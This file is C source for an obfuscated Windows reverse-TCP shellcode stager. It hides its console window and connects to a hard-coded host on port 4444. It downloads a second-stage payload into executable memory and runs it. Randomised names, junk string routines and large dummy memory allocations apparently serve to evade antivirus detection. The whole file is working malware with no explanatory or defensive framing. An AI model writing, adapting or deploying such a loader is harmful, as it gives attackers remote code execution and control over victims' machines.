#define _WIN32_WINNT 0x0500
#if defined(WIN32)
//#include <winsock2.h>
#include <string.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#endif
char* AzUlewgkRew(const char *t)
{
	int length= strlen(t);
	int i;
	char* t2 = (char*)malloc((length+1) * sizeof(char));
	for(i=0;i<length; i++)
	{
		t2[(length - 1) - i] = t[i];
	}
	t2[length] = '\0';
	return t2;
}
char* yDseXJjphi(char* s)
{
	char *result =  malloc(strlen(s)*2+1);
	int i;
	for (i = 0; i < strlen(s) * 2 + 1; i++)
	{
		result[i] = s[i / 2];
		result[i + 1] = s[i / 2];
	}
	result[i] = '\0';
	return result;
}

void VopjrBraBQ(void)
{
	WORD kcSZlWv = MAKEWORD((2 * 1 + 0), (0 * 3 + 2));
	WSADATA wbJHZMSLAQ;
	if (WSAStartup(kcSZlWv, &wbJHZMSLAQ) < 0)
	{
		WSACleanup();
		exit(1);
	}
}

char		*LanlkXCaPNDzsDz(void)
{
	char *xglvFUUTQdqN = AzUlewgkRew("AWoQzJiehcjuguWYkqnOogMWyNYKxVSUJkOVrNPnEiCgrBSuIy");
	return strstr( xglvFUUTQdqN, "N" );
}

void kkEhUmPic(SOCKET MsnUXJzl)
{
	closesocket(MsnUXJzl);
	WSACleanup();
	exit(1);
}

char* ZGSoAtnJqV(void)
{
	char QAvVjsEbGPUGvm[8511], PEKIJjPJLBZO[8511 / 2];
	strcpy(QAvVjsEbGPUGvm,"BwbRgGAzUWjyUIimIxIbfLjiPIsEHBzOWvJtuGyNFpwaAbccPj");
	strcpy(PEKIJjPJLBZO,"GaoLewodZqYGCpYbRLGEYmQMDfYtzGjNUUwwaLsVpGeNPyPQaY");
	return yDseXJjphi(strcat( QAvVjsEbGPUGvm, PEKIJjPJLBZO));
}

int cbNhGSQv(SOCKET UTAgXDWq, void * DOZwBTbwt, int RXJZzalKRd)
{
	int slfkmklsDSA = 0;
	int rcAmwSVM=0;
	void * startb = DOZwBTbwt;
	while (rcAmwSVM < RXJZzalKRd)
	{
		slfkmklsDSA = recv(UTAgXDWq, (char *)startb, RXJZzalKRd - rcAmwSVM, 0);
		startb += slfkmklsDSA;
		rcAmwSVM   += slfkmklsDSA;
		if (slfkmklsDSA == SOCKET_ERROR) kkEhUmPic(UTAgXDWq);
	}
	return rcAmwSVM;
}

char* fmcIUJINFCeE()
{
	char islilxcFL[8511] = "zyeHuRLSgtNhmDTsowftrOgTsdLOCgagZsMqKrfuCJHMpsGHWX";
	char *tOegIV = strupr(islilxcFL);
	return strlwr(tOegIV);
}

SOCKET mMMkfSp()
{
	struct hostent * wKsDYw;
	struct sockaddr_in oUHePKkKvhYt;
	SOCKET tVhfTPojtzOVcpw;tVhfTPojtzOVcpw = socket(AF_INET, SOCK_STREAM, 0);
	if (tVhfTPojtzOVcpw == INVALID_SOCKET) kkEhUmPic(tVhfTPojtzOVcpw);wKsDYw = gethostbyname("192.168.1.19");
	if (wKsDYw == NULL) kkEhUmPic(tVhfTPojtzOVcpw);
	memcpy(&oUHePKkKvhYt.sin_addr.s_addr, wKsDYw->h_addr, wKsDYw->h_length);
	oUHePKkKvhYt.sin_family = AF_INET;
	oUHePKkKvhYt.sin_port = htons((233 * 19 + 17));
	if (connect(tVhfTPojtzOVcpw, (struct sockaddr *)&oUHePKkKvhYt, \
				sizeof(oUHePKkKvhYt)) )
		kkEhUmPic(tVhfTPojtzOVcpw);
	return tVhfTPojtzOVcpw;
}

int		main(int argc, char * argv[])
{
	ShowWindow( GetConsoleWindow(), SW_HIDE );
	ULONG32 mohtDfH;
	char * QwmQfPBy;
	int i;
	char* TxijOseFEFEmz[9975];
	void (*BxKnwcIbYc)();
	for (i = 0;  i < 9975;  ++i)
		TxijOseFEFEmz[i] = malloc (9700);
	VopjrBraBQ();
	char* oERDUZsm[2132];
	SOCKET lYjfLepdN = mMMkfSp();
	for (i = 0;  i < 2132;  ++i)
		oERDUZsm[i] = malloc (9487);
	int KEVMewEk = recv(lYjfLepdN, (char *)&mohtDfH, (2 * 2 + 0), 0);
	if (KEVMewEk != (4*1+0) || mohtDfH <= 0)
		kkEhUmPic(lYjfLepdN);
	QwmQfPBy = VirtualAlloc(0, mohtDfH + (5 * 1 + 0), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	char *viXoBB[7597];
	for (i=0; i<9975; ++i)
	{
		strcpy(TxijOseFEFEmz[i], LanlkXCaPNDzsDz());
	}
	if (QwmQfPBy == NULL)
		kkEhUmPic(lYjfLepdN);
	QwmQfPBy[0] = 0xBF;
	memcpy(QwmQfPBy + 1, &lYjfLepdN, (2*2+0));
	for (i = 0;  i < 7597;  ++i)
		viXoBB[i] = malloc (9333);
	for (i=0; i<2132; ++i)
	{
		strcpy(oERDUZsm[i], ZGSoAtnJqV());
	}
	KEVMewEk = cbNhGSQv(lYjfLepdN, QwmQfPBy + (2 * 2 + 1), mohtDfH);
	BxKnwcIbYc = (void (*)())QwmQfPBy;
	BxKnwcIbYc();
	for (i=0; i<7597; ++i)
	{
		strcpy(viXoBB[i], fmcIUJINFCeE());
	}
	return 0;
}
